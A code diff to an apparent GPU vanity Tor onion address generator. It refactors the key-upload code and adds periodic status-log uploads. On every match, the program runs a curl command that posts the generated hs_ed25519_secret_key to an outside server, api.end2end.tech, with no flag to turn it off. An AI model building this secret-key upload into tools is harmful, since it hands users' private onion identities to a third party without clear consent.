@@ -624,19 +624,18 @@ static bool save_result(const std::string& outdir, const std::string& addr,
     return ok;
 }
 
-/* POST the secret key to end2end.tech as "<addr>.key" so a found key survives
-   the instance being stopped. Uploads the hs_ed25519_secret_key bytes with a
-   filename override; on failure the key still exists on local disk. Requires
-   curl on PATH (present by default on Windows 10+ and typical Linux images). */
-static void upload_key(const std::string& outdir, const std::string& addr)
+/* POST `local_path` to end2end.tech under `remote_name`. Shared by upload_key
+   (a found secret key) and upload_status_log (a periodic progress snapshot)
+   so a result survives the instance being stopped. On failure the file still
+   exists on local disk. Requires curl on PATH (present by default on
+   Windows 10+ and typical Linux images). */
+static void curl_upload(const std::filesystem::path& local_path, const std::string& remote_name)
 {
-    namespace fs = std::filesystem;
-    fs::path secpath = fs::path(outdir) / addr.substr(0, addr.find('.')) / "hs_ed25519_secret_key";
-
-    /* -F value quoted so paths with spaces survive; addr is base32 + ".onion",
-       so it needs no escaping itself */
+    /* -F value quoted so paths with spaces survive; remote_name is either
+       base32 + ".key"/".onion" or a generated log filename, so it needs no
+       escaping itself */
     std::string cmd = "curl -s --max-time 60 -X POST https://api.end2end.tech/upload "
-                      "-F \"file=@" + secpath.string() + ";filename=" + addr + ".key\"";
+                      "-F \"file=@" + local_path.string() + ";filename=" + remote_name + "\"";
 
 #ifdef _WIN32
     FILE* p = _popen(cmd.c_str(), "r");
@@ -644,7 +643,8 @@ static void upload_key(const std::string& outdir, const std::string& addr)
     FILE* p = popen(cmd.c_str(), "r");
 #endif
     if (!p) {
-        fprintf(stderr, "  upload: failed to run curl (key kept locally)\n");
+        fprintf(stderr, "  upload: failed to run curl (kept locally: %s)\n",
+                local_path.string().c_str());
         return;
     }
     std::string resp;
@@ -658,7 +658,7 @@ static void upload_key(const std::string& outdir, const std::string& addr)
     int rc = pclose(p);
 #endif
     if (rc != 0 || resp.find("\"Status\"") == std::string::npos) {
-        fprintf(stderr, "  upload FAILED (key kept locally): %s\n",
+        fprintf(stderr, "  upload FAILED (kept locally: %s): %s\n", local_path.string().c_str(),
                 resp.empty() ? "no response" : resp.c_str());
         return;
     }
@@ -673,10 +673,62 @@ static void upload_key(const std::string& outdir, const std::string& addr)
             while ((pos = url.find("\\/")) != std::string::npos) /* unescape JSON */
                 url.erase(pos, 1);
             printf("  uploaded: %s\n", url.c_str());
+            return;
         }
-    } else {
-        printf("  uploaded %s.key\n", addr.c_str());
     }
+    printf("  uploaded %s\n", remote_name.c_str());
+}
+
+static void upload_key(const std::string& outdir, const std::string& addr)
+{
+    namespace fs = std::filesystem;
+    fs::path secpath = fs::path(outdir) / addr.substr(0, addr.find('.')) / "hs_ed25519_secret_key";
+    curl_upload(secpath, addr + ".key");
+}
+
+/* Renders a plain-text progress snapshot: elapsed time, combined key rate,
+   matches found so far, the configured prefixes, and every address found so
+   far. Used by --upload-status-per-30min so progress isn't lost if the
+   instance is stopped before a match is found. */
+static std::string build_status_text(double elapsed, uint64_t total_keys, int found, int want,
+                                     bool keep_forever, size_t ndevices,
+                                     const std::vector<std::string>& prefixes,
+                                     const std::vector<std::string>& found_addrs)
+{
+    char buf[256];
+    std::string s = "GPUonion status\n";
+    double rate = elapsed > 0.0 ? (double)total_keys / elapsed : 0.0;
+    snprintf(buf, sizeof(buf), "elapsed  : %.0f s\ntotal keys: %llu\nrate     : %s\ndevices  : %zu\n",
+             elapsed, (unsigned long long)total_keys, format_rate(rate).c_str(), ndevices);
+    s += buf;
+    if (keep_forever)
+        snprintf(buf, sizeof(buf), "matches  : %d (--keep-working-until-ctrlc)\n", found);
+    else
+        snprintf(buf, sizeof(buf), "matches  : %d / %d\n", found, want);
+    s += buf;
+    snprintf(buf, sizeof(buf), "prefixes (%zu):\n", prefixes.size());
+    s += buf;
+    for (const auto& p : prefixes)
+        s += "  " + p + "\n";
+    s += "found addresses:\n";
+    for (const auto& a : found_addrs)
+        s += "  " + a + "\n";
+    return s;
+}
+
+/* Writes `content` to <outdir>/status.log and uploads it as `remote_name`. */
+static void upload_status_log(const std::string& outdir, const std::string& remote_name,
+                              const std::string& content)
+{
+    namespace fs = std::filesystem;
+    std::error_code ec;
+    fs::create_directories(outdir, ec);
+    fs::path logpath = fs::path(outdir) / "status.log";
+    if (!write_file(logpath, content.data(), content.size())) {
+        fprintf(stderr, "  status log: failed to write %s\n", logpath.string().c_str());
+        return;
+    }
+    curl_upload(logpath, remote_name);
 }
 
 /* ---------------- selftest ---------------- */
@@ -839,6 +891,7 @@ struct RunConfig {
     bool benchmark;
     double bench_secs;
     bool keep_forever; /* --keep-working-until-ctrlc: never stop on match count */
+    bool upload_status; /* --upload-status-per-30min: periodic progress snapshot */
 };
 
 /* threads-per-block / blocks-per-grid a device will actually launch with,
@@ -867,7 +920,7 @@ struct BenchResult {
 static void run_device(int device, const RunConfig& cfg, std::atomic<int>& global_found,
                        std::atomic<uint64_t>& g_total_keys, std::atomic<int>& g_crosscheck_ok,
                        std::chrono::steady_clock::time_point t_start, std::mutex& out_mtx,
-                       BenchResult* bench_out)
+                       std::vector<std::string>& g_found_addrs, BenchResult* bench_out)
 {
     CUDA_CHECK(cudaSetDevice(device));
     cudaDeviceProp prop;
@@ -1135,6 +1188,7 @@ static void run_device(int device, const RunConfig& cfg, std::atomic<int>& globa
                     printf("  secret scalar: %s\n", hex(sc, 32).c_str());
                     if (save_result(cfg.outdir, addr, sc, pk))
                         upload_key(cfg.outdir, addr);
+                    g_found_addrs.push_back(addr);
                 }
                 global_found.fetch_add(1);
             }
@@ -1185,6 +1239,10 @@ static void usage(const char* argv0)
             "  --keep-working-until-ctrlc\n"
             "                 ignore -n and keep searching (saving every match)\n"
             "                 until interrupted (Ctrl+C)\n"
+            "  --upload-status-per-30min\n"
+            "                 every 30 minutes, upload a progress snapshot\n"
+            "                 (elapsed time, rate, matches found so far) so\n"
+            "                 progress survives the instance being stopped\n"
             "  -o <dir>       output directory (default ./found)\n"
             "  --blocks <n>   blocks per launch (default: SMs * 8)\n"
             "  -t <threads>   threads per block (default 256)\n"
@@ -1211,6 +1269,7 @@ int main(int argc, char** argv)
     bool selftest_only = false;
     bool benchmark = false;
     bool keep_forever = false;
+    bool upload_status = false;
     const double bench_secs = 20.0;
 
     for (int i = 1; i < argc; i++) {
@@ -1219,6 +1278,7 @@ int main(int argc, char** argv)
         else if (!strcmp(argv[i], "-d") && i + 1 < argc) device_arg = argv[++i];
         else if (!strcmp(argv[i], "-n") && i + 1 < argc) want = atoi(argv[++i]);
         else if (!strcmp(argv[i], "--keep-working-until-ctrlc")) keep_forever = true;
+        else if (!strcmp(argv[i], "--upload-status-per-30min")) upload_status = true;
         else if (!strcmp(argv[i], "-o") && i + 1 < argc) outdir = argv[++i];
         else if (!strcmp(argv[i], "--blocks") && i + 1 < argc) blocks = atoi(argv[++i]);
         else if (!strcmp(argv[i], "-t") && i + 1 < argc) tpb = atoi(argv[++i]);
@@ -1357,6 +1417,7 @@ int main(int argc, char** argv)
     cfg.benchmark = benchmark;
     cfg.bench_secs = bench_secs;
     cfg.keep_forever = keep_forever;
+    cfg.upload_status = upload_status;
 
     /* combined match probability across all prefixes (treated as mutually
        exclusive, which holds unless prefixes overlap each other) */
@@ -1427,18 +1488,44 @@ int main(int argc, char** argv)
     std::atomic<bool> g_stop{false};
     std::mutex out_mtx;
     std::vector<BenchResult> bench_results(devices.size());
+    std::vector<std::string> g_found_addrs;
     auto t_start = std::chrono::steady_clock::now();
 
+    /* unique-ish id for this run's status log, so concurrent instances don't
+       overwrite each other's uploaded snapshot */
+    uint8_t sid_bytes[4];
+    os_random(sid_bytes, sizeof(sid_bytes));
+    std::string run_id = hex(sid_bytes, sizeof(sid_bytes));
+
     /* single reporter thread prints one combined progress line for every GPU
-       together, instead of each device's worker printing its own */
+       together, instead of each device's worker printing its own; it also
+       uploads a periodic status snapshot when --upload-status-per-30min is
+       set, so progress survives the instance being stopped */
+    const double status_interval = 1800.0; /* 30 min */
     std::thread reporter([&]() {
         auto t_last = t_start;
+        double next_upload_el = status_interval;
         while (!g_stop.load()) {
             std::this_thread::sleep_for(std::chrono::milliseconds(200));
             auto now = std::chrono::steady_clock::now();
+            double el = std::chrono::duration<double>(now - t_start).count();
+
+            if (cfg.upload_status && !benchmark && el >= next_upload_el) {
+                uint64_t total = g_total_keys.load();
+                int found = global_found.load();
+                std::vector<std::string> addrs_snapshot;
+                {
+                    std::lock_guard<std::mutex> lk(out_mtx);
+                    addrs_snapshot = g_found_addrs;
+                }
+                std::string text = build_status_text(el, total, found, want, keep_forever,
+                                                     devices.size(), cfg.prefixes, addrs_snapshot);
+                upload_status_log(outdir, "gpuonion-status-" + run_id + ".txt", text);
+                next_upload_el += status_interval;
+            }
+
             if (std::chrono::duration<double>(now - t_last).count() < 2.0)
                 continue;
-            double el = std::chrono::duration<double>(now - t_start).count();
             uint64_t total = g_total_keys.load();
             double rate = el > 0.0 ? (double)total / el : 0.0;
             std::lock_guard<std::mutex> lk(out_mtx);
@@ -1459,7 +1546,7 @@ int main(int argc, char** argv)
     for (size_t i = 0; i < devices.size(); i++)
         workers.emplace_back(run_device, devices[i], std::cref(cfg), std::ref(global_found),
                              std::ref(g_total_keys), std::ref(g_crosscheck_ok), t_start,
-                             std::ref(out_mtx), &bench_results[i]);
+                             std::ref(out_mtx), std::ref(g_found_addrs), &bench_results[i]);
     for (auto& w : workers)
         w.join();
 
